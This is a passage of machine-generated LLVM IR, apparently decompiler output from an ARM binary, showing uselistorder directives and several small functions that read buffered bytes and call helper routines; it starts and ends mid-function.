  uselistorder i32 %v1_19080, { 0, 1, 3, 2 }
  uselistorder i32 %v0_19064, { 2, 1, 0 }
  uselistorder i32 %v3_19004, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18fcc, { 0, 1, 3, 2 }
  uselistorder i32 %v4_18fc0, { 1, 2, 0 }
  uselistorder i32 %v0_18fc0, { 1, 0 }
  uselistorder i32 %v1_18fc8.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_18f80, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_18f64, { 1, 0 }
  uselistorder i32 %storemerge155, { 1, 0 }
  uselistorder i32 %v0_18f40, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_18f08, { 1, 0 }
  uselistorder i32 %v1_18f08, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18f04, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_18e64, { 2, 1, 0 }
  uselistorder i32 %v2_18de4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_18dd4, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_18dc0, { 1, 0, 2 }
  uselistorder i32 %v5_18dbc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18e4c30, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_18d74, { 1, 0 }
  uselistorder i32 %v1_18d6c, { 1, 2, 0 }
  uselistorder i32 %v2_18d60, { 1, 0 }
  uselistorder i32 %v1_18d60, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18d60, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_18d30, { 1, 0 }
  uselistorder i32 %v0_18d30, { 0, 2, 1 }
  uselistorder i32 %v2_18d2c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_18d18, { 1, 0 }
  uselistorder i1 %v2_18d08, { 1, 0 }
  uselistorder i32 %v1_18d04, { 3, 2, 1, 0 }
  uselistorder i32 %v2_18d00, { 1, 0 }
  uselistorder i1 %v2_18cf0, { 1, 0 }
  uselistorder i32 %v1_18ce4, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_18c98, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18c98, { 1, 0, 2 }
  uselistorder i1 %v2_18c80, { 1, 0 }
  uselistorder i32 %v5_18c68, { 1, 0 }
  uselistorder i32 %v0_18c54, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18c38, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18c14, { 1, 0 }
  uselistorder i32 %v0_18bd0, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18b78, { 1, 0 }
  uselistorder i32 %v5_18b38, { 1, 0, 2 }
  uselistorder i32 %v2_18b38, { 1, 0, 2 }
  uselistorder i32 %v2_18afc, { 1, 0, 2 }
  uselistorder i32 %v0_18af8, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_18af4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_18aec, { 1, 0 }
  uselistorder i32 %v2_18b28, { 1, 3, 0, 2 }
  uselistorder i32 %v0_18abc, { 1, 0 }
  uselistorder i32 %v5_18a78, { 1, 0 }
  uselistorder i32 %v1_18998.v0_189845, { 1, 0 }
  uselistorder i32 %v3_18a54, { 1, 0 }
  uselistorder i32 %v0_18a30, { 3, 2, 1, 0 }
  uselistorder i32 %v2_18a18, { 2, 1, 0 }
  uselistorder i32 %v0_189fc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1891c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp182, { 0, 1, 2, 5, 4, 3, 7, 6, 8 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 10, 0, 11, 1, 2, 3, 4, 5, 6, 8, 9, 7 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 27, 41, 28, 32, 29, 30, 31, 33, 26, 34, 35, 36, 37, 38, 39, 40, 63, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 2, 64, 65, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 34, 33, 35, 36, 37, 40, 38, 39, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 14, 16, 12, 17, 15, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 3, 9, 17, 20, 19, 18, 10, 11, 16, 12, 13, 2, 15, 14, 21, 22, 23, 42, 24, 26, 25, 27, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 39, 40, 38, 41, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 54, 18, 19, 20, 21, 22, 23, 24, 25, 53, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 52, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 160, { 0, 1, 3, 2 }
  uselistorder i32 112, { 2, 7, 0, 8, 3, 1, 9, 4, 5, 6 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1dde0, { 1, 0 }
  uselistorder i32 1104006501, { 1, 4, 0, 2, 3 }
  uselistorder i32 96, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_1ddb0, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1dac4, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1dd98, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_136dc.996 to i32), i32 100680), { 1, 3, 2, 0, 4 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 0, 4, 5 }
  uselistorder label %dec_label_pc_190a4, { 1, 0 }
  uselistorder label %dec_label_pc_1905c, { 2, 0, 1 }
  uselistorder label %bb250, { 1, 0 }
  uselistorder label %dec_label_pc_18fbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18f34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18f04, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_18edc, { 1, 0 }
  uselistorder label %dec_label_pc_18eb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18e8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18e5c, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18da4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_18d94, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %.thread142, { 1, 0 }
  uselistorder label %._crit_edge91, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb219, { 1, 0 }
  uselistorder label %dec_label_pc_18cbc, { 2, 1, 0 }
  uselistorder label %bb216, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18bc8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_18b78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18b70, { 1, 0 }
  uselistorder label %bb208, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %dec_label_pc_18a54, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_18970, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %bb199, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
}

define i32 @function_190dc() local_unnamed_addr {
dec_label_pc_190dc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_190dc = load i32, i32* @r4, align 4
  store i32 %v3_190dc, i32* %stack_var_-28, align 4
  %v0_190e0 = load i32, i32* @r0, align 4
  %v1_190e0 = add i32 %v0_190e0, 52
  %v2_190e0 = inttoptr i32 %v1_190e0 to i32*
  %v3_190e0 = load i32, i32* %v2_190e0, align 4
  %v1_190e8 = sub i32 1, %v3_190e0
  %v2_190e8 = icmp ult i32 %v3_190e0, 2
  br i1 %v2_190e8, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_190dc
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_190dc, %bb
  %storemerge20 = phi i32 [ 0, %bb ], [ %v1_190e8, %dec_label_pc_190dc ]
  %v0_190f0 = phi i32 [ 0, %bb ], [ %v1_190e8, %dec_label_pc_190dc ]
  store i32 %storemerge20, i32* @r7, align 4
  %v2_190f0 = icmp eq i32 %v0_190f0, 0
  store i32 180260, i32* @r6, align 4
  store i32 %v0_190e0, i32* @r5, align 4
  %v0_19100 = load i32, i32* @r1, align 4
  store i32 %v0_19100, i32* @sl, align 4
  %v0_19104 = load i32, i32* @r2, align 4
  store i32 %v0_19104, i32* @r8, align 4
  br i1 %v2_190f0, label %dec_label_pc_19144, label %dec_label_pc_1910c

dec_label_pc_1910c:                               ; preds = %bb15
  %v1_19110 = add i32 %v0_190e0, 56
  store i32 %v1_19110, i32* @r4, align 4
  %v4_19124 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_19124)
  %v0_19138 = load i32, i32* @r6, align 4
  %v2_19138 = add i32 %v0_19138, 16
  %v3_19138 = inttoptr i32 %v2_19138 to i32*
  %v4_19138 = load i32, i32* %v3_19138, align 4
  store i32 %v4_19138, i32* @ip, align 4
  store i32 102724, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19138)
  %v0_19144.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19144

dec_label_pc_19144:                               ; preds = %bb15, %dec_label_pc_1910c
  %v0_19154 = phi i32 [ %v0_190e0, %bb15 ], [ %v0_19144.pre, %dec_label_pc_1910c ]
  %v1_19144 = inttoptr i32 %v0_19154 to i16*
  %v2_19144 = load i16, i16* %v1_19144, align 2
  %v1_19148 = and i16 %v2_19144, 192
  %v2_1914c = icmp eq i16 %v1_19148, 192
  br i1 %v2_1914c, label %dec_label_pc_1916c, label %dec_label_pc_19154

dec_label_pc_19154:                               ; preds = %dec_label_pc_19144
  %v3_1915c = call i32 @function_18620(i16* %v1_19144, i32 128)
  %v2_19160 = icmp eq i32 %v3_1915c, 0
  br i1 %v2_19160, label %dec_label_pc_19154.dec_label_pc_1916c_crit_edge, label %dec_label_pc_19180

dec_label_pc_19154.dec_label_pc_1916c_crit_edge:  ; preds = %dec_label_pc_19154
  %v0_1916c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1916c

dec_label_pc_1916c:                               ; preds = %dec_label_pc_19154.dec_label_pc_1916c_crit_edge, %dec_label_pc_19144
  %v0_1916c = phi i32 [ %v0_1916c.pre, %dec_label_pc_19154.dec_label_pc_1916c_crit_edge ], [ %v0_19154, %dec_label_pc_19144 ]
  %v0_19170 = load i32, i32* @sl, align 4
  %v0_19174 = load i32, i32* @r8, align 4
  %v3_19178 = inttoptr i32 %v0_19170 to i8*
  %v4_19178 = call i32 @function_12ea0(i32 %v0_1916c, i8* %v3_19178, i32 %v0_19174)
  br label %dec_label_pc_19180

dec_label_pc_19180:                               ; preds = %dec_label_pc_19154, %dec_label_pc_1916c
  %storemerge = phi i32 [ %v4_19178, %dec_label_pc_1916c ], [ -1, %dec_label_pc_19154 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_19180 = load i32, i32* @r7, align 4
  %v2_19180 = icmp eq i32 %v0_19180, 0
  br i1 %v2_19180, label %dec_label_pc_19180..thread4_crit_edge, label %bb17

dec_label_pc_19180..thread4_crit_edge:            ; preds = %dec_label_pc_19180
  br label %.thread4

bb17:                                             ; preds = %dec_label_pc_19180
  %v1_19190 = load i32, i32* @r6, align 4
  %v3_19190 = add i32 %v1_19190, 24
  %v4_19190 = inttoptr i32 %v3_19190 to i32*
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_19180..thread4_crit_edge, %bb17
  %v0_19198.in = phi i32* [ @ip, %dec_label_pc_19180..thread4_crit_edge ], [ %v4_19190, %bb17 ]
  %v0_19198 = load i32, i32* %v0_19198.in, align 4
  %v2_19198 = xor i1 %v2_19180, true
  call void @__pseudo_cond_branch(i1 %v2_19198, i32 %v0_19198)
  %v0_1919c = load i32, i32* %r4.global-to-local, align 4
  %v2_191a4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_191a4, i32* %r4.global-to-local, align 4
  ret i32 %v0_1919c

; uselistorder directives
  uselistorder i32 %v3_190e0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32)* @function_12ea0, { 1, 0 }
  uselistorder i32 (i16*, i32)* @function_18620, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_19180, { 1, 0 }
  uselistorder label %dec_label_pc_19144, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_191b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_191b0:
  %v0_191b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_191b0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_191b0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_191b0, %bb
  %v10_191bc = phi i32 [ %arg1, %dec_label_pc_191b0 ], [ 0, %bb ]
  ret i32 %v10_191bc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_191c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_191c0:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_191c0 = load i32, i32* @r4, align 4
  store i32 %v3_191c0, i32* %stack_var_-16, align 4
  %v6_191c0 = load i32, i32* @r5, align 4
  %v12_191c0 = load i32, i32* @lr, align 4
  %v1_191c4 = add i32 %arg1, 52
  %v2_191c4 = inttoptr i32 %v1_191c4 to i32*
  %v3_191c4 = load i32, i32* %v2_191c4, align 4
  %v2_191cc = icmp eq i32 %v3_191c4, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 180260, i32* %r6.global-to-local, align 4
  br i1 %v2_191cc, label %dec_label_pc_19204, label %dec_label_pc_191e0

dec_label_pc_191e0:                               ; preds = %dec_label_pc_191c0
  %v1_191e0 = add i32 %arg1, 16
  %v2_191e0 = inttoptr i32 %v1_191e0 to i32*
  %v3_191e0 = load i32, i32* %v2_191e0, align 4
  %v1_191e4 = add i32 %arg1, 24
  %v2_191e4 = inttoptr i32 %v1_191e4 to i32*
  %v3_191e4 = load i32, i32* %v2_191e4, align 4
  %v3_191e8 = icmp ult i32 %v3_191e0, %v3_191e4
  br i1 %v3_191e8, label %.thread, label %dec_label_pc_191f8

.thread:                                          ; preds = %dec_label_pc_191e0
  %v2_191ec = inttoptr i32 %v3_191e0 to i8*
  %v3_191ec = load i8, i8* %v2_191ec, align 1
  %v4_191ec = zext i8 %v3_191ec to i32
  store i32 %v4_191ec, i32* %r4.global-to-local, align 4
  %v6_191ec = add i32 %v3_191e0, 1
  store i32 %v6_191ec, i32* %v2_191e0, align 4
  br label %dec_label_pc_19278

dec_label_pc_191f8:                               ; preds = %dec_label_pc_191e0
  %v1_191f8 = inttoptr i32 %arg1 to i16*
  %v2_191f8 = call i32 @function_196ec(i16* %v1_191f8)
  store i32 %v2_191f8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19278

dec_label_pc_19204:                               ; preds = %dec_label_pc_191c0
  %v1_19208 = add i32 %arg1, 56
  store i32 %v1_19208, i32* @r4, align 4
  %v4_1921c = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_1921c)
  %v0_19230 = load i32, i32* %r6.global-to-local, align 4
  %v2_19230 = add i32 %v0_19230, 16
  %v3_19230 = inttoptr i32 %v2_19230 to i32*
  %v4_19230 = load i32, i32* %v3_19230, align 4
  store i32 102972, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19230)
  %v0_1923c = load i32, i32* @r5, align 4
  %v1_1923c = add i32 %v0_1923c, 16
  %v2_1923c = inttoptr i32 %v1_1923c to i32*
  %v3_1923c = load i32, i32* %v2_1923c, align 4
  %v1_19240 = add i32 %v0_1923c, 24
  %v2_19240 = inttoptr i32 %v1_19240 to i32*
  %v3_19240 = load i32, i32* %v2_19240, align 4
  %v3_19244 = icmp ult i32 %v3_1923c, %v3_19240
  br i1 %v3_19244, label %.thread2, label %dec_label_pc_19254

.thread2:                                         ; preds = %dec_label_pc_19204
  %v2_19248 = inttoptr i32 %v3_1923c to i8*
  %v3_19248 = load i8, i8* %v2_19248, align 1
  %v4_19248 = zext i8 %v3_19248 to i32
  store i32 %v4_19248, i32* %r4.global-to-local, align 4
  %v6_19248 = add i32 %v3_1923c, 1
  store i32 %v6_19248, i32* %v2_1923c, align 4
  br label %dec_label_pc_19260

dec_label_pc_19254:                               ; preds = %dec_label_pc_19204
  %v1_19258 = inttoptr i32 %v0_1923c to i16*
  %v2_19258 = call i32 @function_196ec(i16* %v1_19258)
  store i32 %v2_19258, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19260

dec_label_pc_19260:                               ; preds = %.thread2, %dec_label_pc_19254
  %v0_1926c = load i32, i32* %r6.global-to-local, align 4
  %v2_1926c = add i32 %v0_1926c, 24
  %v3_1926c = inttoptr i32 %v2_1926c to i32*
  %v4_1926c = load i32, i32* %v3_1926c, align 4
  store i32 %v4_1926c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1926c)
  br label %dec_label_pc_19278

dec_label_pc_19278:                               ; preds = %.thread, %dec_label_pc_191f8, %dec_label_pc_19260
  %v0_19278 = load i32, i32* %r4.global-to-local, align 4
  %v2_19280 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19280, i32* @r4, align 4
  store i32 %v6_191c0, i32* @r5, align 4
  store i32 %v12_191c0, i32* @lr, align 4
  ret i32 %v0_19278

; uselistorder directives
  uselistorder i32 %v3_1923c, { 1, 0, 2 }
  uselistorder i32 %v3_191e0, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 5, 4, 1, 2 }
  uselistorder label %dec_label_pc_19278, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19260, { 1, 0 }
}

define i32 @function_1928c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1928c:
  %v0_1928c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1928c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1928c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1928c, %bb
  %v10_19298 = phi i32 [ %arg1, %dec_label_pc_1928c ], [ 0, %bb ]
  ret i32 %v10_19298

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1929c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1929c:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1929c = load i32, i32* @r4, align 4
  store i32 %v3_1929c, i32* %stack_var_-28, align 4
  %v6_1929c = load i32, i32* @r5, align 4
  %v9_1929c = load i32, i32* @r6, align 4
  %v12_1929c = load i32, i32* @r7, align 4
  %v21_1929c = load i32, i32* @lr, align 4
  %v1_192a0 = add i32 %arg3, 52
  %v2_192a0 = inttoptr i32 %v1_192a0 to i32*
  %v3_192a0 = load i32, i32* %v2_192a0, align 4
  %v1_192a8 = sub i32 1, %v3_192a0
  %v2_192a8 = icmp ult i32 %v3_192a0, 2
  br i1 %v2_192a8, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1929c
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1929c, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_192a8, %dec_label_pc_1929c ]
  %v0_192b0 = phi i32 [ 0, %bb ], [ %v1_192a8, %dec_label_pc_1929c ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_192b0 = icmp eq i32 %v0_192b0, 0
  store i32 180260, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_192b0, label %dec_label_pc_19304, label %dec_label_pc_192cc

dec_label_pc_192cc:                               ; preds = %bb16
  %v1_192d0 = add i32 %arg3, 56
  store i32 %v1_192d0, i32* @r4, align 4
  %v4_192e4 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_192e4)
  %v0_192f8 = load i32, i32* @r5, align 4
  %v2_192f8 = add i32 %v0_192f8, 16
  %v3_192f8 = inttoptr i32 %v2_192f8 to i32*
  %v4_192f8 = load i32, i32* %v3_192f8, align 4
  store i32 %v4_192f8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_19304.1022 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_192f8)
  %v0_19304.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_19308.pre = load i32, i32* @r7, align 4
  %v0_1930c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19304

dec_label_pc_19304:                               ; preds = %bb16, %dec_label_pc_192cc
  %v0_1930c = phi i32 [ %arg3, %bb16 ], [ %v0_1930c.pre, %dec_label_pc_192cc ]
  %v0_19308 = phi i32 [ %arg2, %bb16 ], [ %v0_19308.pre, %dec_label_pc_192cc ]
  %v0_19304 = phi i32 [ %arg1, %bb16 ], [ %v0_19304.pre, %dec_label_pc_192cc ]
  %v3_19310 = inttoptr i32 %v0_19304 to i8*
  %v4_19310 = call i32 @function_19818(i8* %v3_19310, i32 %v0_19308, i32 %v0_1930c)
  %v0_19314 = load i32, i32* %sl.global-to-local, align 4
  %v2_19314 = icmp eq i32 %v0_19314, 0
  store i32 %v4_19310, i32* %r4.global-to-local, align 4
  br i1 %v2_19314, label %dec_label_pc_19304..thread3_crit_edge, label %bb17

dec_label_pc_19304..thread3_crit_edge:            ; preds = %dec_label_pc_19304
  %v0_19330.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_19304
  %v1_19328 = load i32, i32* @r5, align 4
  %v3_19328 = add i32 %v1_19328, 24
  %v4_19328 = inttoptr i32 %v3_19328 to i32*
  %v5_19328 = load i32, i32* %v4_19328, align 4
  store i32 %v5_19328, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19304..thread3_crit_edge, %bb17
  %v0_19330 = phi i32 [ %v0_19330.pre, %dec_label_pc_19304..thread3_crit_edge ], [ %v5_19328, %bb17 ]
  %v2_19330 = xor i1 %v2_19314, true
  call void @__pseudo_cond_branch(i1 %v2_19330, i32 %v0_19330)
  %v0_19334 = load i32, i32* %r4.global-to-local, align 4
  %v2_1933c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1933c, i32* @r4, align 4
  store i32 %v6_1929c, i32* @r5, align 4
  store i32 %v9_1929c, i32* @r6, align 4
  store i32 %v12_1929c, i32* @r7, align 4
  store i32 %v21_1929c, i32* @lr, align 4
  ret i32 %v0_19334

; uselistorder directives
  uselistorder i32 %v3_192a0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_19304, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_19348(i32 %arg1) local_unnamed_addr {
dec_label_pc_19348:
  %v0_19348 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19348, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19348
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19348, %bb
  %v10_19354 = phi i32 [ %arg1, %dec_label_pc_19348 ], [ 0, %bb ]
  ret i32 %v10_19354

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_19358() local_unnamed_addr {
dec_label_pc_19358:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_19358 = load i32, i32* @r4, align 4
  store i32 %v3_19358, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_12cb8.1025 to i32), i32 103276), i32* %r6.global-to-local, align 4
  %v4_19368 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_12cb8.1025 to i32), i32 103312) to i32*), align 4
  store i32 %v4_19368, i32* %r8.global-to-local, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_19370 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_12cb8.1025 to i32), i32 103392) to i32*), align 4
  store i32 %v4_19370, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_1937c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_12cb8.1025 to i32), i32 103352) to i32*), align 4
  store i32 %v4_1937c, i32* %r7.global-to-local, align 4
  %v2_19388 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_1937c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1939c = load i32, i32* %r6.global-to-local, align 4
  %v2_1939c = add i32 %v0_1939c, 16
  %v3_1939c = inttoptr i32 %v2_1939c to i32*
  %v4_1939c = load i32, i32* %v3_1939c, align 4
  store i32 %v4_1939c, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1939c)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_193ac = load i32, i32* %r6.global-to-local, align 4
  %v2_193ac = add i32 %v0_193ac, 12
  %v3_193ac = inttoptr i32 %v2_193ac to i32*
  %v4_193ac = load i32, i32* %v3_193ac, align 4
  store i32 %v4_193ac, i32* %r3.global-to-local, align 4
  %v1_193b0 = inttoptr i32 %v4_193ac to i32*
  %v2_193b0 = load i32, i32* %v1_193b0, align 4
  store i32 %v2_193b0, i32* %r3.global-to-local, align 4
  %v7_193b4 = icmp eq i32 %v2_193b0, 1
  br i1 %v7_193b4, label %dec_label_pc_193bc, label %dec_label_pc_1947c

dec_label_pc_193bc:                               ; preds = %dec_label_pc_19358
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_193c0 = add i32 %v0_193ac, 52
  %v3_193c0 = inttoptr i32 %v2_193c0 to i32*
  %v4_193c0 = load i32, i32* %v3_193c0, align 4
  store i32 %v4_193c0, i32* %r3.global-to-local, align 4
  %v1_193c4 = inttoptr i32 %v4_193c0 to i32*
  %v2_193c4 = load i32, i32* %v1_193c4, align 4
  store i32 %v2_193c4, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_193c4, 1
  br i1 %tmp30, label %dec_label_pc_1947c, label %dec_label_pc_193d0

dec_label_pc_193d0:                               ; preds = %dec_label_pc_193bc
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_193d4 = add i32 %v0_193ac, 104
